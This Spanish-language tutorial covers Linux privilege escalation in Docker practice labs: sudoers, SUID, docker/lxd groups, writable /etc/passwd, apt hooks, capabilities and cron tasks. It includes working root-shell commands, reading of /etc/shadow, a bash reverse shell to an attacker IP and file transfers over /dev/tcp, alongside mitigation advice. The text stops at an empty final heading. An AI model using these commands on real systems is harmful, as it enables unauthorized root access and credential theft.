---
title: "Técnicas de escalada de privilegios"
date: 2023-12-25
categories: [Priviledge Escalation]
tags: [privesc, sudoers, suid, permissions, services, groups, capabilities, cron tasks, docker, kernel, path hijacking, library hijacking]
image:
    path: /assets/thumbnail/privesc.png
---

# Abusando privilegios de Sudoers
    
El archivo **/etc/sudoers** es un archivo de configuración en sistemas Linux que se utiliza para controlar el acceso de los usuarios a las diferentes acciones que pueden realizar en el sistema. Este archivo contiene una lista de usuarios y grupos de usuarios que tienen permisos para realizar tareas de administración en el sistema.
    
El comando “**sudo**” permite a los usuarios ejecutar comandos como superusuario o como otro usuario con privilegios especiales. El archivo sudoers especifica qué usuarios pueden ejecutar qué comandos con sudo y con qué privilegios.
    
Abusar de los privilegios a nivel de sudoers es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Si un atacante es capaz de obtener acceso a una cuenta con permisos de sudo en el archivo sudoers, puede ejecutar comandos con privilegios especiales y realizar acciones maliciosas en el sistema.
    
El comando “**sudo -l**” es utilizado para listar los permisos de sudo de un usuario en particular. Al ejecutar este comando, se muestra una lista de los comandos que el usuario tiene permiso para ejecutar y bajo qué condiciones.
    
Para prevenir el abuso de privilegios a nivel de sudoers, se recomienda mantener los permisos adecuados en el archivo sudoers y limitar el número de usuarios con permisos de sudo. Además, es importante monitorear regularmente el archivo sudoers y buscar cambios inesperados o sospechosos en su contenido.

## Instalación

```bash
docker pull ubuntu:latest
docker run -dit --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
```

Dentro de la consola del contenedor ejecutar los siguientes comandos:

```bash
apt update
apt install nano sudo nmap
useradd -d /home/pepe -s /bin/bash -m pepe
useradd -d /home/sara -s /bin/bash -m sara

passwd pepe -> pepe123
passwd sara -> sara123
```

### Asignación de permisos sudo sobre un comando:

De primeras los usuarios no tienen permisos de sudo pero para este lab se les asignará permisos sudo sobre diferentes comandos para ver cómo se podría aprovechar de esto para escalar privilegios.

![Untitled](/assets/Privesc/Abusing-Sudoers-Permissions/Untitled.png)

Para esto, se modificará el archivo “/etc/sudoers/” el cual permitirá asignar reglas de sudoers. En este caso se asignará permisos de sudo al usuario pepe sobre el comando awk, y a la usuaria sara permisos de sudo sobre el comando nmap.

```bash
nano /etc/sudoers
```

![Untitled](/assets/Privesc/Abusing-Sudoers-Permissions/Untitled 1.png)

Para ejecutar estos comandos como sudo, el usuario puede usar alguno de estos comando:

```bash
sudo -u root <comando>
sudo <comando>
```

Nota: Para encontrar formas de explotar estos binarios, se atenderá a la web: [https://gtfobins.github.io/gtfobins](https://gtfobins.github.io/gtfobins)

## Explotación de permisos sudo sobre awk

El usuario pepe tiene permisos para ejecutar el comando awk como usuario root:

![Untitled](/assets/Privesc/Abusing-Sudoers-Permissions/Untitled 2.png)

Obtener una shell:

```bash
{% raw %}
sudo awk 'BEGIN {system("/bin/bash")}'

----

sudo -u root awk 'BEGIN {system("/Bin/bash")}'
{% endraw %}
```

## Explotación de permisos sudo sobre nmap

La usuaria sara tiene permisos de ejecutar nmap como el usuario root:

![Untitled](/assets/Privesc/Abusing-Sudoers-Permissions/Untitled 3.png)

Obtener una shell:

La idea es crear un script “.nse” en un directorio como “/tmp” para luego llamarlo con nmap. El contenido de este script será el siguiente:

```bash
os.execute("/bin/bash")

---

echo 'os.execute("/bin/bash")' > /tmp/script.nse
```

![Untitled](/assets/Privesc/Abusing-Sudoers-Permissions/Untitled 4.png)

Nota: Al crear la shell, es posible que no se vean los comando ingresados, para esto, se podría enviar una reverse shell a la máquina del atacante con el siguiente comando:

```bash
bash -c "bash -i >& /dev/tcp/<ipAttacker>/<Port> 0>&1"
```

![Untitled](/assets/Privesc/Abusing-Sudoers-Permissions/Untitled 5.png)

# Abusando de privilegios SUID

Un privilegio **SUID** (**Set User ID**) es un permiso especial que se puede establecer en un archivo binario en sistemas Unix/Linux. Este permiso le da al usuario que ejecuta el archivo los **mismos privilegios** que el **propietario** del archivo.
    
Por ejemplo, si un archivo binario tiene establecido el permiso SUID y es propiedad del usuario root, cualquier usuario que lo ejecute adquirirá temporalmente los mismos privilegios que el usuario root, lo que le permitirá realizar acciones que normalmente no podría hacer como un usuario normal.
    
El abuso de privilegios SUID es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Si un atacante es capaz de obtener acceso a un archivo binario con permisos SUID, puede ejecutar comandos con privilegios especiales y realizar acciones maliciosas en el sistema.
    
Para prevenir el abuso de privilegios SUID, se recomienda limitar el número de archivos con permisos SUID y asegurarse de que solo se otorguen a archivos que requieran este permiso para funcionar correctamente. Además, es importante monitorear regularmente el sistema para detectar cambios inesperados en los permisos de los archivos y para buscar posibles brechas de seguridad.

## Instalación

```bash
docker pull ubuntu:latest
docker run -dit --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
```

La idea para este lab es probar cómo se podría explotar el permiso SUID en comandos como “base64” y “php”.

Primero, se asignará el permiso SUID a estos binarios:

```bash
{% raw %}
# Base64
file=$(which base64); chmod u+s $file; ls -l $file

# PHP
# [Nota] Debido a que hay links simbólicos, se debe ir al 
# archivo original para asignarle el permiso SUID. Se puede 
# copiar y pegar el siguiente comando
file2=$(which php | xargs ls -l | awk 'NF{print $NF}' | xargs ls -l | awk 'NF{print $NF}'); chmod u+s $file2; ls -l $file2
{% endraw %}
```

![Untitled](/assets/Privesc/Abusing-SUID/Untitled.png)

![Untitled](/assets/Privesc/Abusing-SUID/Untitled 1.png)

## Explotación del SUID

Leer archivos con el comando base64:

```bash
# Mostrar el contenido de "/etc/shadow" en base64
base64 -w 0 /etc/shadow

# Mostrar el contenido de /etc/shadow
base64 -w 0 /etc/shadow | base64 -d
```

Obtener una shell con el comando PHP:

```bash
php -r "pcntl_exec('/bin/bash', ['-p']);"
```

![Untitled](/assets/Privesc/Abusing-SUID/Untitled 2.png)

# Abuso de grupos de usuario especiales

    
En el contexto de Linux, los **grupos** se utilizan para **organizar** a los usuarios y **asignar** **permisos** para acceder a los recursos del sistema. Los usuarios pueden pertenecer a uno o varios grupos, y los grupos pueden tener diferentes niveles de permisos para acceder a los recursos del sistema.
    
Existen grupos especiales en Linux, como ‘**lxd**‘ o ‘**docker**‘, que se utilizan para permitir a los usuarios ejecutar contenedores de manera segura y eficiente. Sin embargo, si un usuario malintencionado tiene acceso a uno de estos grupos, podría aprovecharlo para obtener privilegios elevados en el sistema.
    
Por ejemplo, si un usuario tiene acceso al grupo ‘**docker**‘, podría utilizar la herramienta Docker para desplegar nuevos contenedores en el sistema. Durante el proceso de despliegue, el usuario podría aprovecharse de las **monturas** (**mounts**) para hacer que ciertos recursos inaccesibles en la máquina host estén disponibles en el contenedor. Al ganar acceso al contenedor como usuario ‘**root**‘, el usuario malintencionado podría inferir o manipular el contenido de estos recursos desde el contenedor.
    
Para mitigar el riesgo de abuso de grupos de usuario especiales, es importante limitar cuidadosamente el acceso a estos grupos y asegurarse de que sólo se asignan a usuarios confiables que realmente necesitan acceder a ellos.
    

## Escenario

Otra forma en la que un atacante se podría aprovechar es a través de los grupos y es que hay grupos con permisos especiales que si no se configuran bien, pueden llevar a una escalada de privilegios.

En este ejemplo, se explotará la capacidad de los grupos “docker” y “lxd”.

## Explotación del grupo “Docker”

Primero se debe asignar un usuario no privilegiado al grupo Docker:

```bash
usermod -a -G docker bryan
su bryan
id
```

![Untitled](/assets/Privesc/Abusing-Groups/Untitled.png)

Todos los usuarios que estén en grupo docker tienen permisos para ejecutar comandos de docker como listar imágenes, contenedores, crear contenedores, etc.

En este caso el usuario bryan está en el grupo docker así que con este usuario se creará una imagen de la siguiente manera:

```bash
docker pull ubuntu:latest
docker run --rm -dit -v /:/mnt/root --name ubuntuServer ubuntu
```

Lo que el usuario está haciendo es crear un contenedor y está aprovechándose de las monturas para montar toda la raíz de la máquina víctima en el directorio /mnt/root del contenedor de forma que cuando ingrese en el contenedor como root, podrá acceder a todo el directorio raíz de la máquina víctima e incluso asignarle permisos SUID a la bash.

```bash
docker exec -it ubuntuServer bash
cd /mnt/root
chmod u+s /bin/bash
```

![Untitled](/assets/Privesc/Abusing-Groups/Untitled 1.png)

## Explotación del grupo “adm”

Todos los usuarios en este grupo tiene permisos para visualizar los logs del sistema, esto de primeras no hará que se pueda escalar privilegios pero se podría conseguir información valiosa.

Se podría buscar archivos y directorios en los cuales esté asignado el grupo “adm”.

```bash
find / -group adm
```

![Untitled](/assets/Privesc/Abusing-Groups/Untitled 2.png)

## Explotación del grupo “lxd”

LXD es un grupo parecido a ya que permite desplegar contenedores, ver imágenes, etc.

- ¿Qué es LXD?
    
    LXD, forma abreviada de Linux Container Daemon, **es una herramienta de gestión de los contenedores del sistema operativo Linux**.
    
    LinuX Containers, también conocido por el acrónimo LXC, es una **tecnología de virtualización a nivel de sistema operativo para Linux**. LXC permite que un servidor físico ejecute múltiples instancias de espacios de usuario aislados, conocidos como jaulas, Servidores Privados Virtuales o Entornos Virtuales (EV).
    

Para instalarlo:

```bash
snap install lxd

# Para removerlo:
snap remove lxd
```

El atacante al ver que tiene permisos en el grupo lxd, podrá aprovecharse de un exploit que permite escalar privilegios.

```bash
searchsploit lxd
searchsplot -m linux/local/46978.sh
mv 46978.sh privesc.sh
```

![Untitled](/assets/Privesc/Abusing-Groups/Untitled 3.png)

Ahora se debe descargar la imagen de alpine para crear un contenedor con ella.

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine

# Crear un comprimido de la imagen
# [Nota] Se debe hacer como root, esto se hace desde la 
# máquina local para luego mandar el comprimido a la 
# máquina víctima
bash build-alpine
```

Ahora a la máquina víctima se le debe pasar el archivo “privec.sh” y la imagen comprimida de alpine y hecho esto, se ejecuta el siguiente comando:

```bash
./privesc.sh -f <imagenComprimida>
```

Esto proporcionará una consola como root en el contenedor pero el directorio raíz de la máquina víctima estará montada en “/mnt/root” y ahora se puede asignar permisos SUID a la bash.

Una vez que se sale del contenedor, este se eliminará automáticamente.

# Abuso de permisos incorrectamente implementados

    
En sistemas Linux, los archivos y directorios tienen permisos que se utilizan para controlar el acceso a ellos. Los permisos se dividen en tres categorías: propietario, grupo y otros. Cada categoría puede tener permisos de lectura, escritura y ejecución. Los permisos de un archivo pueden ser modificados por el propietario o por el superusuario del sistema.
    
El abuso de permisos incorrectamente implementados ocurre cuando los permisos de un archivo crítico son configurados incorrectamente, permitiendo a un usuario no autorizado acceder o modificar el archivo. Esto puede permitir a un atacante leer información confidencial, modificar archivos importantes, ejecutar comandos maliciosos o incluso obtener acceso de superusuario al sistema.
    
De esta forma, un atacante experimentado podría aprovecharse de esta falla para elevar sus privilegios en el mejor de los casos. Una de las herramientas encargadas de aplicar este reconocimiento en el sistema es ‘**lse**‘. Linux Smart Enumeration (LSE) es una herramienta de enumeración de seguridad para sistemas operativos basados en Linux, diseñada para ayudar a los administradores de sistemas y auditores de seguridad a identificar y evaluar vulnerabilidades y debilidades en la configuración del sistema.
    
LSE está diseñado para ser fácil de usar y proporciona una salida clara y legible para facilitar la identificación de problemas de seguridad. La herramienta utiliza comandos de Linux estándar y se ejecuta en la línea de comandos, lo que significa que no se requiere software adicional. Además, enumera una amplia gama de información del sistema, incluyendo usuarios, grupos, servicios, puertos abiertos, tareas programadas, permisos de archivos, variables de entorno y configuraciones del firewall, entre otros.
    
A continuación, se os proporciona el enlace directo al proyecto de Github correspondiente a esta herramienta:
    
- **Linux Smart Enumeration**: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **LinPEAS: [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**

## Instalación

```bash
docker pull ubuntu:latest
docker run -dit --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
```

## Escenario

La idea de este lab es demostrar cómo se podría aprovechar de archivos con permisos mal configurados, para este ejemplo se usará el archivo “/etc/passwd” y se le asignarán permisos de escritura para que cualquier usuario pueda modificarlo.

```bash
chmod o+w /etc/passwd
```

Las contraseñas de los usuario se almacenan en el archivo “/etc/shadow” pero si el atacante pudiera modificar el archivo “/etc/passwd”, podría añadir una contraseña para el usuario root, de forma que cuando se intente iniciar sesión como el usuario root, el sistema tomará la contraseña ingresada y la comparará primero con la que está en el archivo “/etc/passwd”

## Explotación

Ejemplo #1: /etc/passwd

El atacante identifica permisos de escritura sobre el archivo “/etc/passwd” por lo que creará una contraseña nueva para luego ingresarla en este archivo.

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled.png)

Se crea una nueva contraseña con un formato que sea permitida por el “/etc/passwd” ya que no se pueden utilizar contraseñas que estén en texto plano.

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 1.png)

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 2.png)

Ahora al intentar iniciar sesión como root, se ingresa la contraseña creada.

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 3.png)

Ejemplos #2: Permisos de directorio

Otro aspecto a tener en cuenta son los permisos que se le asignan a los directorios de los archivos.

Por ejemplo, el usuario root ejecuta la siguiente tarea cron:

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 4.png)

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 5.png)

El atacante al identificar este script, se da cuenta que no tiene permisos de escritura sobre este.

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 6.png)

El problema es que este archivo se encuentra dentro del directorio del usuario pepe y aunque no pueda modificarlo, puede eliminarlo.:

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 7.png)

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 8.png)

Ahora el atacante puede crear otro “script.sh” y hacer que el usuario root ejecute un comando, por ejemplo, para añadir el permiso SUID al archivo “/bin/bash”.

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 9.png)

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 10.png)

## Formas de detectar archivos con permisos mal configurados

Usar find para encontrar archivos con diferentes permisos:

```bash
find / -writable 2>/dev/null
find / -readable 2>/dev/null
find / -executable 2>dev/null

# Se podría buscar por archivos de configuración ya que 
# estos podrían contener contraseñas
find / \*config\* 2>/dev/null
```

Usar herramientas automatizadas como LSE o LinPEAS:
- **Linux Smart Enumeration (LSE)**: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **LinPEAS**: [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

Si la máquina víctima no tiene wget instalado, se puede pasar el script de la máquina local a la víctima

```bash
# Máquina local
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
nc -nlvp 4646 < lse.sh

----
# Máquina víctima
cat < /dev/tcp/<IPAtacante>/<puerto> > lse.sh
 
```

![Untitled](/assets/Privesc/Abusing-Incorrect-Permissions/Untitled 11.png)

Por último se le asignan permisos de ejecución y se puede ejecutar el script con el siguiente comando:

```bash
./lse.sh -l 2
```

# Abuso de servicios internos del sistema

    
Los **servicios internos** son componentes esenciales que operan en segundo plano dentro de un sistema operativo, encargándose de funciones críticas como la gestión de red, impresión, actualización de software y monitoreo del sistema, entre otros.
    
No obstante, si estos servicios **no están configurados adecuadamente** y se encuentran activos, pueden representar una brecha de seguridad significativa. Los atacantes podrían explotar estos servicios para obtener acceso no autorizado al sistema y llevar a cabo actividades malintencionadas.
    
Un ejemplo concreto sería un servicio de red mal configurado con permisos elevados. Si un atacante logra identificarlo y hallar una forma de aprovecharlo, podría utilizarlo para escalar privilegios y obtener acceso de administrador.

### Más info:

- Links
    
    cyberciti - (”[https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/)”)
    

## Escenario

Un atacante debe identificar los servicios que están corriendo en el sistema ya que puede haber servicios de los cuales se podría aprovechar para escalar privilegios o ejecutar tareas maliciosas. Para este lab se creará un servicio que se encargará de actualizar el sistema cada cierto tiempo con el comando “apt update”.

Esto es similar a una tarea cron pero configurado a nivel de servicio interno.

Primero se creará un archivo con el nombre de “apt-update.service” en el directorio “/etc/systemd/system/”. A este archivo se le ingresará el siguiente contenido.

```bash
[Unit] # Indica que esto es una unidad de servicio
Description=Update pakages list # Descripción de la función del servicio

[Service] # Indica cómo se ejecutará el servicio
Type=oneshot # El servicio se ejecutará una única vez y se detendrá automáticamente
ExecStart=/usr/bin/apt update # Comando que usará el servicio
```

Ahora se creará otro archivo que se llamará “apt-update.timer” el cual indicará cada cuánto tiempo se ejecutará la tarea.

```bash
[Unit]
Description=Update pakages list every 30 seconds

[Timer]
OnUnitActiveSec=30s
Unit=apt-update.service # Sincroniza este archivo con el archivo .service creado

[Install]
WantedBy=timers.target # Esto es una unidad predefinida de systemd para controlar todos los temporizadores
```

Ahora toca desplegar este servicio.

```bash
systemctl daemon-reload
systemctl enable apt-update.timer
systemctl start apt-update.timer
systemctl start apt-update.service

# Para deshabilitarlos todos
systemctl disable apt-update.timer
systemctl stop apt-update.timer
systemctl stop apt-update.service
```

Una vez hecho esto, verificar que el timer esté presente con el comando “systemctl list-timers” y si no, parar y deshabilitar los servicios y volverlos a iniciar.

Ahora, para poder explotar la vulnerabilidad, se dará permisos de escritura a otros sobre el archivo “/etc/apt/apt.conf.d”.

```bash
chmod o+w /etc/apt/apt.conf.d
```

## Explotación de servicio - Actualización del sistema (apt update)

Un atacante puede listar los timers de servicios del sistema con el siguiente comando:

```bash
systemctl list-timers

# Ver la ruta en la que se encuentra el timer
find / -name <nombreDeTimer> 2>/dev/null
```

También se podría hacer uso de herramientas automatizadas como pspy.

![Untitled](/assets/Privesc/Abusing-Services/Untitled.png)

![Untitled](/assets/Privesc/Abusing-Services/Untitled 1.png)

El atacante debe analizar el servicio que está corriendo y ver qué está ejecutando, en este caso el servicio está usando el comando “apt” y como en este caso se tienen permisos de escritura sobre su carpeta de configuración, se pueden establecer políticas para indicar qué comando se debe ejecutar antes o después de hacer la actualización del sistema, esto se define mediante un **pre-invoke** y un **post-invoke**.

![Untitled](/assets/Privesc/Abusing-Services/Untitled 2.png)

En este caso se quiere ejecutar un comando antes que se haga la actualización por lo que creará un archivo que se llamará “01privesc” en el directorio “/etc/apt/apt.conf.d/” y se le ingresará el siguiente contenido:

```bash
{% raw %}
APT::Update::Pre-Invoke {"chmod u+s /bin/bash"; };
{% endraw %}
```

Esto lo que hará es que cuando se ejecute el servicio, antes de hacer el apt update, ejecutará este comando y añadirá un permiso SUID a la bash.

![Untitled](/assets/Privesc/Abusing-Services/Untitled 3.png)

Para deshabilitar y revertir todo lo creado:

```bash
systemctl disable apt-update.timer
systemctl stop apt-update.timer
systemctl stop apt-update.service
cd /etc/systemd/system/
rm apt-update.timer
rm apt-update.service
chmod u-s /bin/bash
chmod o-w /etc/opr/ops.conf.d
```

# Detección y explotación de Capabilities

    
En sistemas Linux, las capabilities son una funcionalidad de seguridad que permite a los usuarios realizar acciones que normalmente requieren privilegios de superusuario (**root**), sin tener que concederles acceso completo de superusuario. Esto se hace para mejorar la seguridad, ya que un proceso que solo necesita ciertos privilegios puede obtenerlos sin tener que ejecutarse como root.
    
Las capabilities se dividen en 3 tipos:
    
- **Permisos efectivos (effective capabilities)**: son los permisos que se aplican directamente al proceso que los posee. Estos permisos determinan las acciones que el proceso puede realizar. Por ejemplo, la capability “**CAP_NET_ADMIN**” permite al proceso modificar la configuración de red.
- **Permisos heredados (inheritable capabilities)**: son los permisos que se heredan por los procesos hijos que son creados. Estos permisos pueden ser adicionales a los permisos efectivos que ya posee el proceso padre. Por ejemplo, si un proceso padre tiene la capability “**CAP_NET_ADMIN**” y esta capability se configura como heredable, entonces los procesos hijos también tendrán la capability “**CAP_NET_ADMIN**“.
- **Permisos permitidos (permitted capabilities)**: son los permisos que un proceso tiene permitidos. Esto incluye tanto permisos efectivos como heredados. Un proceso solo puede ejecutar acciones para las que tiene permisos permitidos. Por ejemplo, si un proceso tiene la capability “**CAP_NET_ADMIN**” y la capability “**CAP_SETUID**” configurada como permitida, entonces el proceso puede modificar la configuración de red y cambiar su **UID** (**User ID**).
    
Ahora bien, algunas capabilities pueden suponer un riesgo desde el punto de vista de la seguridad si se les asignan a determinados binarios. Por ejemplo, la capability **cap_setuid** permite a un proceso establecer el UID (User ID) de un proceso a otro valor diferente al suyo, lo que puede permitir que un usuario malintencionado ejecute código malicioso con privilegios elevados.
    
Para **listar** las capabilities de un archivo binario en Linux, puedes usar el comando **getcap**. Este comando muestra las capabilities efectivas, heredables y permitidas del archivo. Por ejemplo, para ver las capabilities del archivo binario **/usr/bin/ping**, puedes ejecutar el siguiente comando en la terminal:
    
➜ `getcap /usr/bin/ping`
    
La salida del comando mostrará las capabilities asignadas al archivo:
    
➜ `/usr/bin/ping = cap_net_admin,cap_net_raw+ep`
    
En este caso, el binario ping tiene dos capabilities asignadas: **cap_net_admin** y **cap_net_raw+ep**. La última capability (**cap_net_raw+ep**) indica que el archivo tiene el bit de ejecución elevado (**ep**) y la capability **cap_net_raw** asignada.
    
Para **asignar** una capability a un archivo binario, puedes utilizar el comando **setcap**. Este comando establece las capabilities efectivas, heredables y permitidas para el archivo especificado.
    
Por ejemplo, para otorgar la capability **cap_net_admin** al archivo binario **/usr/bin/my_program**, puedes ejecutar el siguiente comando en la terminal:
    
➜ `sudo setcap cap_net_admin+ep /usr/bin/my_program`
    
En este caso, el comando otorga la capability **cap_net_admin** al archivo **/usr/bin/my_program**, y también establece el bit de ejecución elevado (**ep**). Ahora, el archivo my_program tendrá permisos para administrar la configuración de red.
    
El **bit de ejecución elevado** (en inglés, elevated execution bit o “**ep**“) es un atributo especial que se puede establecer en un archivo binario en Linux. Este atributo se utiliza en conjunción con las capabilities para permitir que un archivo se ejecute con permisos especiales, incluso si el usuario que lo ejecuta no tiene privilegios de superusuario.
    
Cuando un archivo binario tiene el bit de ejecución elevado establecido, se puede ejecutar con las capabilities efectivas asignadas al archivo, en lugar de las capabilities del usuario que lo ejecuta. Esto significa que el archivo puede realizar acciones que normalmente solo están permitidas a los usuarios con privilegios elevados.
    
Es importante señalar que los permisos permitidos pueden ser limitados aún más mediante el uso de un mecanismo de control de acceso obligatorio (MAC, Mandatory Access Control), como **SELinux** o **AppArmor**, que restringen las acciones que los procesos pueden realizar en función de la política de seguridad del sistema.
    

## Instalación

```bash
docker pull ubuntu:latest
docker run -dit --privileged --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
apt update
apt install libcap2-bin tcpdump net-tools python3 vim
userd add -d /home/pepe -s /bin/bash pepe
```


## Ver información de los procesos

Se puede ver información de las capabilities de los procesos atendiendo al directorio /proc/<PID>/status donde PID corresponderá al identificador del proceso

```bash
# Ver información de la capability
cat /proc/PID/status | grep Cap

# ver el directorio actual de trabajo del proceso
pwdx <PID>

# Ver informaciónde los procesos ejecutándose actualmente
ps -faux
ps -eo user,command
```

![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled.png)

Se puede decodear esa cadena en hexadecimal con el siguiente comando:

```bash
capsh --decode=0000003fffffffff
```

## Ver información de las Capabilities

Para este ejemplo se asignará las capability: “cap_net_admin+eip” y “cap_net_raw” al archivo /usr/bin/tcpdump, esto servirá para que cualquier usuario pueda utilizar el comando tcpdump:

```bash
setcap cap_net_admin+eip,cap_net_raw /usr/bin/tcpdump
```

El atacante puede identificar esta capability con los siguientes comandos:

```bash
getcap -r / 2>/dev/null
cat /proc/<PID>/status | grep Cap
capsh --decode=<hex>
getpcaps <PID>

# Ver capabilities activas en un contenedor
capsh --print
```

![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled 1.png)

## Explotación de Capabilities

### cap_setuid=ep - python3

Para este ejemplo, se asignará esta capability a python3.

Nota: Se debe asignar el permiso al archivo original y no a un enlace simbólico.

```bash
setcap cap_setuid+ep /usr/bin/python3.10
```

![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled 2.png)

El atacante se puede aprovechar de esta vulnerabilidad para cambiar el UID del usuario actual por el del usuario root:

```bash
python3 -c 'import os; os.setuid(0); os.system("bash")'
```

![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled 3.png)

### cap_setuid=ep - vim

Para este ejemplo se asignará la capability a vim.

Nota: Se debe asignar el permiso al archivo original y no al enlace simbólico.

```bash
setcap cap_setuid+ep /usr/bin/vim.basic
```

![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled 4.png)

El atacante ahora se puede aprovechar de este permiso para elevar su privilegio:

Nota: Usar la versión de python correspondiente, en este caso se usa “py3”.

```bash
# Obtener una sh
$(which vim) -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# Obtener una bash
$(which vim) -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```

![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled 5.png)


# Detección y explotación de tareas Cron
    
Una tarea **cron** es una tarea programada en sistemas Unix/Linux que se ejecuta en un momento determinado o en intervalos regulares de tiempo. Estas tareas se definen en un archivo **crontab** que especifica qué comandos deben ejecutarse y cuándo deben ejecutarse.
    
La detección y explotación de tareas cron es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Por ejemplo, si un atacante detecta que un archivo está siendo ejecutado por el usuario “root” a través de una tarea cron que se ejecuta a intervalos regulares de tiempo, y se da cuenta de que los permisos definidos en el archivo están mal configurados, podría manipular el contenido del mismo para incluir instrucciones maliciosas las cuales serían ejecutadas de forma privilegiada como el usuario ‘root’, dado que corresponde al usuario que está ejecutando dicho archivo.
    
Ahora bien, para detectar tareas cron, los atacantes pueden utilizar herramientas como **Pspy**. Pspy es una herramienta de línea de comandos que monitorea las tareas que se ejecutan en segundo plano en un sistema Unix/Linux y muestra las nuevas tareas que se inician.
    
Con el objetivo de reducir las posibilidades de que un atacante lograra explotar las tareas cron en un sistema, se recomienda llevar a cabo alguno de los siguientes puntos:
    
- **Limitar el número de tareas cron**: es importante limitar el número de tareas cron que se ejecutan en el sistema y asegurarse de que solo se otorgan permisos a tareas que requieren permisos especiales para funcionar correctamente. Esto disminuye la superficie de ataque y reduce las posibilidades de que un atacante pueda encontrar una tarea cron vulnerable.
- **Verificar los permisos de las tareas cron**: es importante revisar los permisos de las tareas cron para asegurarse de que solo se otorgan permisos a usuarios y grupos autorizados. Además, se recomienda evitar otorgar permisos de superusuario a las tareas cron, a menos que sea estrictamente necesario.
- **Supervisar regularmente el sistema**: es importante monitorear regularmente el sistema para detectar cambios inesperados en las tareas cron y para buscar posibles brechas de seguridad. Además, se recomienda utilizar herramientas de monitoreo de seguridad para detectar actividades sospechosas en el sistema.
- **Configurar los registros de la tarea cron**: se recomienda habilitar la opción de registro para las tareas cron, para poder identificar cualquier actividad sospechosa en las tareas definidas y para poder llevar un registro de las actividades realizadas por cada una de estas.


### Más info:

- Links
    
    desdelinux - (”[https://blog.desdelinux.net/cron-crontab-explicados/](https://blog.desdelinux.net/cron-crontab-explicados/)”)
    

## Instalación

```bash
docker pull ubuntu:latest
docker run -dit --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
apt install cron
service cron start
```

Para definir las tareas cron, se usa el siguiente comando:

```bash
crontab -e
```

Se le ingresará la siguiente tarea la cual se le indica al usuario root que ejecute un script de bash con “/bin/bash” el cual se encuentra en “/tmp/script.sh”

![Untitled](/assets/Privesc/Exploiting-Cron-Tasks/Untitled.png)

El script lo que hace es ejecutar el comando “whoami” y el stdout lo redirige al archivo “myuser.txt” en “/tmp/”.

## Formas de identificar tareas cron

Un atacante debe identificar las tareas cron que están corriendo en el sistema. Hay varias formas en las que se puede hacer esto, una de ellas es hacerlo manualmente aprovechando el comando “ps -eo user,command” y la otra es con herramientas automatizadas como pspy.

```bash
ps -eo user,command

# Verificar tareas cron
crontab -l
cat /etc/crontab
```

El comando “ps -eo user,command” muestra todos los comandos que se están corriendo en el sistema actualmente y el usuario que los está ejecutando como se puede ver en la captura, además se ve que el usuario root está ejecutando cron por lo que se puede intuir que está ejecutando tareas cron.

![Untitled](/assets/Privesc/Exploiting-Cron-Tasks/Untitled 1.png)

Esto se puede aprovechar para crear un script que monitoree esta actividad.

```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|procmon|kworker"
	old_process=$new_process
done
```

Se puede ver cómo abre y cierra la tarea que ejecuta el “script.sh”:

![Untitled](/assets/Privesc/Exploiting-Cron-Tasks/Untitled 2.png)

## Herramientas automatizadas

También se puede hacer el uso de herramientas automatizadas como pspy que lo que hará es monitorear el sistema en busca de comandos ejecutados por algún usuario.

Para esto primero hay que descargar el “pspy64”: https://github.com/DominicBreuker/pspy

![Untitled](/assets/Privesc/Exploiting-Cron-Tasks/Untitled 3.png)

Y una vez descargado envía el binario de la máquina local a la máquina víctima:

```bash
# Máquina víctima
cat < /dev/tcp/192.168.0.108/4646 > pspy

----

# Máquina local
nc -nlvp 4646 < pspy
```

![Untitled](/assets/Privesc/Exploiting-Cron-Tasks/Untitled 4.png)

Ahora se hace una comprobación de hashes para comprobar la integridad de los datos enviados.

![Untitled](/assets/Privesc/Exploiting-Cron-Tasks/Untitled 5.png)

Por último hay que darle permisos de ejecución al archivo para ejecutarlo y esperar a la ejecución de la tarea cron.

![Untitled](/assets/Privesc/Exploiting-Cron-Tasks/Untitled 6.png)

# Docker Breakout

